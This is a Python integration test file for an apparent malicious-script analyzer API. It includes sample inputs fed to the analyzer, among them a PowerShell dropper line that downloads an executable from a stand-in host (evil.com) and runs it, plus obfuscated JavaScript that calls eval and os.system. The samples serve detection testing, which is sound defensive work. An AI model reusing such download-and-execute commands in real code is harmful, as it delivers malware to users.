# backend/test_api.py
import sys, os
sys.path.insert(0, os.path.dirname(__file__))

from fastapi.testclient import TestClient
from main import app

client = TestClient(app)

BENIGN_PY     = b"x = 1 + 2\nprint(x)\n"
SUSPICIOUS_PS1 = b"$wc = New-Object System.Net.WebClient\n$wc.DownloadFile('http://evil.com/p.exe', $env:TEMP+'\\p.exe')\nStart-Process ($env:TEMP+'\\p.exe')\n"
OBFUSCATED_JS  = b"eval(atob('dmFyIHggPSAxMjM='));\nvar aaaaabbbbccccddddeeee = 'x';\neval(exec(\"os.system('whoami')\"));\n"


def section(t): print(f"\n{'='*50}\n  {t}\n{'='*50}")


def test_health():
    section("GET /health")
    r = client.get("/health")
    assert r.status_code == 200
    d = r.json()
    print(f"  status: {d['status']} | ollama: {d['ollama_available']}")
    print("  ✓ PASS")


def test_bad_ext():
    section("POST /analyze — 잘못된 확장자")
    r = client.post("/analyze", files={"file": ("mal.exe", b"\x4d\x5a", "application/octet-stream")})
    assert r.status_code == 415
    print(f"  {r.status_code} → {r.json()['detail'][:60]}")
    print("  ✓ PASS")


def test_empty():
    section("POST /analyze — 빈 파일")
    r = client.post("/analyze", files={"file": ("empty.py", b"", "text/plain")})
    assert r.status_code == 400
    print(f"  {r.status_code} → {r.json()['detail']}")
    print("  ✓ PASS")


def test_file(label, fname, content):
    section(f"POST /analyze — {label}")
    r = client.post("/analyze", files={"file": (fname, content, "text/plain")})
    assert r.status_code == 200
    res = r.json()["result"]
    loc = res["local"]
    print(f"  파일: {res['filename']} | 언어: {res['lang_hint']}")
    print(f"  위험도: {loc['risk_score']:.3f} → {loc['risk_level'].upper()}")
    token_msg = "SKIP ✓ (TOKEN_SAVE)" if res["llm_skipped"] else "호출됨"
    print(f"  Claude API: {token_msg} | {res['processing_time_ms']}ms")
    print("  ✓ PASS")


def test_404():
    section("GET /analyze/00000000 — 없는 ID")
    r = client.get("/analyze/00000000")
    assert r.status_code == 404
    print(f"  {r.status_code} → {r.json()['detail']}")
    print("  ✓ PASS")


if __name__ == "__main__":
    print("\n🔍 MalScript Analyzer — API 통합 테스트")
    test_health()
    test_bad_ext()
    test_empty()
    test_file("정상 파일",      "hello.py",  BENIGN_PY)
    test_file("의심 PowerShell","drop.ps1",  SUSPICIOUS_PS1)
    test_file("난독화 JS",      "obf.js",    OBFUSCATED_JS)
    test_404()
    print(f"\n{'='*50}\n  모든 테스트 통과 ✓\n{'='*50}\n")
